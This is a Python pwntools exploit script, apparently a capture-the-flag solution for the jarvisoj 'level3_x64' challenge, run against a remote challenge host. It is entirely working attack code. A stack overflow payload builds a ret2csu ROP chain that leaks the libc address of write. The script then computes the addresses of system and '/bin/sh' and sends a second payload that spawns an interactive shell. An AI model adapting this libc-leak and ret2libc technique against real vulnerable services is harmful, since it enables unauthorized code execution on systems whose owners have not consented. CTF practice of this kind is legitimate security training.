#!/usr/bin/env python
# -*- encoding: utf-8 -*-
__author__ = 'Albertchang'

from pwn import *
#context.log_level = "debug"
DEBUG = 0
LOCAL = 0
if LOCAL == 1:
            p = process('./level3_x64')
else:
            p = remote('127.0.0.1',6666)
            p = remote('pwn2.jarvisoj.com',9883)

elf = ELF('level3_x64')
libc = ELF('libc-2.19.so')
# write
got_write = elf.got['write']
print "got_write: " + hex(got_write)

# main
main_addr = 0x40061a

# offset for system and binsh
off_system_addr = libc.symbols['write'] - libc.symbols['system']
off_binsh_addr  = libc.symbols['write'] - next(libc.search('/bin/sh'))
print "off_system_addr: " + hex(off_system_addr)

# pop rdi,ret addr
poprdi_addr = 0x00000000004006B3
gadget1_addr = 0x00000000004006AA
gadget2_addr = 0x0000000000400690
print "\n#############sending payload1#############\n"
print "\n#############get write_addr in online#############\n"
print "\n#############calc system and binsh addr#############\n"
#rdi=  edi = r13,  rsi = r14, rdx = r15
#write(rdi=1, rsi=write.got, rdx=4)
payload1 =  "\x00" * 136 + p64(gadget1_addr) + p64(0) + p64(1) + p64(got_write) + p64(8) + p64(got_write) + p64(1) + p64(gadget2_addr) + "\x00" * 56 + p64(main_addr)
p.recvuntil("Input:\n")
p.send(payload1)
write_addr = u64(p.recv(8))
system_addr = write_addr - off_system_addr
binsh_addr = write_addr - off_binsh_addr
print "write_addr: " + hex(write_addr)
print "system_addr: " + hex(system_addr)
print "binsh_addr:" + hex(binsh_addr)

print "\n#############sending payload2#############\n"
print "\n#############use pop rdi,ret#############\n"
print "\n#############get shell#############\n"
p.recvuntil("Input:\n")
if DEBUG == 1:
            context.terminal = ['gnome-terminal', '-x', 'zsh', '-c']
            gdb.attach(proc.pidof(p)[0])
payload2 = 'A' * 136 + p64(poprdi_addr) + p64(binsh_addr) + p64(system_addr)
p.send(payload2)
p.interactive()

